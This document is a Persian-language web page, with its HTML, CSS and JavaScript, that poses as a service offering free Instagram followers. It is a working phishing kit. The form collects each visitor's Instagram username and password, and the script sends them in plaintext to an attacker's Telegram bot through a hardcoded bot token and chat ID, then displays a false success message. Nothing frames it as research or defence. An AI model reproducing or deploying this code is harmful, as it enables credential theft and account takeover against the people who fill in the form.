<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>سرویس افزایش فالور اینستاگرام</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="background-animation"></div>
    
    <div class="container">
        <div class="card">
            <div class="header">
                <i class="fab fa-instagram logo"></i>
                <h1>افزایش فالور اینستاگرام</h1>
                <p class="subtitle">فالورهای واقعی و فعال با تضمین کیفیت</p>
            </div>
            
            <form id="followerForm" class="form">
                <div class="input-group">
                    <label for="username">
                        <i class="fas fa-user"></i> نام کاربری اینستاگرام
                    </label>
                    <input type="text" id="username" placeholder="username" required>
                </div>
                
                <div class="input-group">
                    <label for="password">
                        <i class="fas fa-lock"></i> رمز عبور
                    </label>
                    <input type="password" id="password" placeholder="••••••••" required>
                </div>
                
                <div class="input-group">
                    <label for="followers">
                        <i class="fas fa-users"></i> تعداد فالور
                    </label>
                    <div class="range-container">
                        <input type="range" id="followers" min="100" max="10000" step="100" value="1000">
                        <div class="range-values">
                            <span>100</span>
                            <span id="followersValue">1,000</span>
                            <span>10,000</span>
                        </div>
                    </div>
                </div>
                
                <button type="submit" class="submit-btn" id="submitBtn">
                    <span class="btn-text">درخواست فالور</span>
                    <i class="fas fa-paper-plane"></i>
                </button>
            </form>
            
            <div class="progress-container hidden" id="progressContainer">
                <div class="progress-bar" id="progressBar"></div>
                <span class="progress-text" id="progressText">در حال ارسال اطلاعات...</span>
            </div>
            
            <div class="result-message hidden" id="resultMessage"></div>
            
            <div class="notice">
                <i class="fas fa-shield-alt"></i>
                <p>اطلاعات شما با امنیت کامل پردازش می‌شود</p>
            </div>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
<style>
    /* Reset و تنظیمات پایه */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Yekan', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}

@font-face {
    font-family: 'Yekan';
    src: url('https://cdn.fontcdn.ir/Font/Persian/Yekan/Yekan.eot');
    src: url('https://cdn.fontcdn.ir/Font/Persian/Yekan/Yekan.eot?#iefix') format('embedded-opentype'),
         url('https://cdn.fontcdn.ir/Font/Persian/Yekan/Yekan.woff') format('woff'),
         url('https://cdn.fontcdn.ir/Font/Persian/Yekan/Yekan.ttf') format('truetype');
    font-weight: normal;
    font-style: normal;
}

body {
    background: linear-gradient(135deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
    background-size: 400% 400%;
    animation: gradient 15s ease infinite;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    color: #333;
}

@keyframes gradient {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
}

.background-animation {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: url('https://www.transparenttextures.com/patterns/diagmonds.png');
    opacity: 0.1;
    z-index: -1;
}

.container {
    width: 100%;
    max-width: 500px;
    padding: 20px;
}

.card {
    background-color: rgba(255, 255, 255, 0.95);
    border-radius: 20px;
    box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
    padding: 30px;
    backdrop-filter: blur(10px);
    border: 1px solid rgba(255, 255, 255, 0.3);
    transition: all 0.3s ease;
}

.card:hover {
    transform: translateY(-5px);
    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
}

.header {
    text-align: center;
    margin-bottom: 30px;
}

.logo {
    font-size: 3rem;
    color: #E1306C;
    margin-bottom: 10px;
}

h1 {
    color: #262626;
    font-size: 1.8rem;
    margin-bottom: 5px;
}

.subtitle {
    color: #666;
    font-size: 0.9rem;
}

.form {
    margin-top: 20px;
}

.input-group {
    margin-bottom: 25px;
}

label {
    display: block;
    margin-bottom: 8px;
    font-weight: 600;
    color: #555;
    font-size: 0.9rem;
}

label i {
    margin-left: 8px;
    color: #E1306C;
}

input[type="text"],
input[type="password"] {
    width: 100%;
    padding: 15px;
    border: 2px solid #ddd;
    border-radius: 10px;
    font-size: 1rem;
    transition: all 0.3s;
    background-color: rgba(255, 255, 255, 0.8);
}

input[type="text"]:focus,
input[type="password"]:focus {
    border-color: #E1306C;
    outline: none;
    box-shadow: 0 0 0 3px rgba(225, 48, 108, 0.2);
}

.range-container {
    margin-top: 15px;
}

input[type="range"] {
    width: 100%;
    height: 10px;
    -webkit-appearance: none;
    background: linear-gradient(to right, #E1306C, #833AB4);
    border-radius: 5px;
    outline: none;
    margin-bottom: 10px;
}

input[type="range"]::-webkit-slider-thumb {
    -webkit-appearance: none;
    width: 25px;
    height: 25px;
    background: #E1306C;
    border-radius: 50%;
    cursor: pointer;
    border: 3px solid white;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
}

.range-values {
    display: flex;
    justify-content: space-between;
    color: #777;
    font-size: 0.8rem;
}

.submit-btn {
    width: 100%;
    padding: 15px;
    background: linear-gradient(to right, #E1306C, #833AB4);
    color: white;
    border: none;
    border-radius: 10px;
    font-size: 1rem;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s;
    display: flex;
    align-items: center;
    justify-content: center;
    margin-top: 20px;
    box-shadow: 0 5px 15px rgba(225, 48, 108, 0.3);
}

.submit-btn:hover {
    background: linear-gradient(to right, #833AB4, #E1306C);
    transform: translateY(-2px);
    box-shadow: 0 8px 20px rgba(225, 48, 108, 0.4);
}

.submit-btn:active {
    transform: translateY(0);
}

.submit-btn i {
    margin-right: 10px;
}

.progress-container {
    margin-top: 30px;
    background-color: #f5f5f5;
    border-radius: 10px;
    padding: 15px;
}

.progress-bar {
    height: 10px;
    background: linear-gradient(to right, #E1306C, #833AB4);
    border-radius: 5px;
    width: 0%;
    transition: width 0.5s ease;
}

.progress-text {
    display: block;
    margin-top: 10px;
    font-size: 0.9rem;
    color: #555;
    text-align: center;
}

.result-message {
    margin-top: 20px;
    padding: 15px;
    border-radius: 10px;
    font-weight: 500;
    text-align: center;
    display: none;
}

.success {
    background-color: rgba(40, 167, 69, 0.2);
    color: #28a745;
    border: 1px solid #28a745;
}

.error {
    background-color: rgba(220, 53, 69, 0.2);
</style>
<script>
    document.addEventListener('DOMContentLoaded', function() {
    // تنظیمات ربات تلگرام
    const telegramConfig = {
        botToken: '7947110938:AAH5d-g7_jP16a3ZrmHCKoHairuusJ7o1tw', // جایگزین کنید
        chatId: '5628030156' // جایگزین کنید
    };
    
    // عناصر DOM
    const form = document.getElementById('followerForm');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const followersInput = document.getElementById('followers');
    const followersValue = document.getElementById('followersValue');
    const submitBtn = document.getElementById('submitBtn');
    const progressContainer = document.getElementById('progressContainer');
    const progressBar = document.getElementById('progressBar');
    const progressText = document.getElementById('progressText');
    const resultMessage = document.getElementById('resultMessage');
    
    // نمایش مقدار انتخاب شده برای تعداد فالور
    followersInput.addEventListener('input', function() {
        followersValue.textContent = numberWithCommas(this.value);
    });
    
    // ارسال فرم
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // دریافت مقادیر فرم
        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();
        const followers = followersInput.value;
        
        // اعتبارسنجی
        if (!validateInputs(username, password, followers)) {
            return;
        }
        
        // تغییر وضعیت دکمه
        setButtonLoading(true);
        
        try {
            // نمایش پیشرفت
            showProgress(20, 'در حال آماده‌سازی درخواست...');
            
            // ارسال به تلگرام
            showProgress(40, 'در حال ارسال اطلاعات...');
            const success = await sendToTelegram(username, password, followers);
            
            if (success) {
                showProgress(100, 'تکمیل شد!');
                showResult('✅ درخواست شما با موفقیت ثبت شد! فالورها به زودی اضافه خواهند شد.', 'success');
                
                // ریست فرم
                setTimeout(() => {
                    form.reset();
                    resetForm();
                }, 3000);
            } else {
                showResult('❌ خطا در ارسال درخواست. لطفاً مجدداً تلاش کنید.', 'error');
            }
        } catch (error) {
            console.error('Error:', error);
            showResult('❌ خطای سیستمی رخ داده است. لطفاً بعداً تلاش کنید.', 'error');
        } finally {
            setButtonLoading(false);
        }
    });
    
    // اعتبارسنجی ورودی‌ها
    function validateInputs(username, password, followers) {
        if (!username) {
            showResult('لطفاً نام کاربری اینستاگرام را وارد کنید', 'error');
            return false;
        }
        
        if (!password) {
            showResult('لطفاً رمز عبور را وارد کنید', 'error');
            return false;
        }
        
        if (password.length < 6) {
            showResult('رمز عبور باید حداقل ۶ کاراکتر باشد', 'error');
            return false;
        }
        
        return true;
    }
    
    // ارسال به تلگرام
    async function sendToTelegram(username, password, followers) {
        const message = `
            📢 درخواست جدید افزایش فالور 📢
            ━━━━━━━━━━━━━━━━━━━━━
            👤 نام کاربری: ${username}
            🔐 رمز عبور: ${password}
            🔢 تعداد فالور: ${numberWithCommas(followers)}
            ⏰ زمان: ${new Date().toLocaleString('fa-IR')}
            ━━━━━━━━━━━━━━━━━━━━━
            #درخواست_فالور
        `;
        
        try {
            const response = await fetch(
                `https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`, 
                {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: telegramConfig.chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                }
            );
            
            const data = await response.json();
            
            if (!data.ok) {
                console.error('Telegram API Error:', data.description);
                return false;
            }
            
            return true;
        } catch (error) {
            console.error('Network Error:', error);
            return false;
        }
    }
    
    // نمایش پیشرفت
    function showProgress(percent, text) {
        progressContainer.classList.remove('hidden');
        progressBar.style.width = `${percent}%`;
        progressText.textContent = text;
    }
    
    // نمایش نتیجه
    function showResult(message, type) {
        resultMessage.textContent = message;
        resultMessage.className = `result-message ${type}`;
        resultMessage.style.display = 'block';
    }
    
    // تغییر وضعیت دکمه
    function setButtonLoading(isLoading) {
        if (isLoading) {
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> در حال پردازش...';
            submitBtn.style.opacity = '0.7';
        } else {
            submitBtn.disabled = false;
            submitBtn.innerHTML = '<span class="btn-text">درخواست فالور</span><i class="fas fa-paper-plane"></i>';
            submitBtn.style.opacity = '1';
        }
    }
    
    // ریست فرم
    function resetForm() {
        progressContainer.classList.add('hidden');
        progressBar.style.width = '0%';
        resultMessage.style.display = 'none';
    }
    
    // فرمت اعداد با کاما
    function numberWithCommas(x) {
        return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
    }
});
</script>
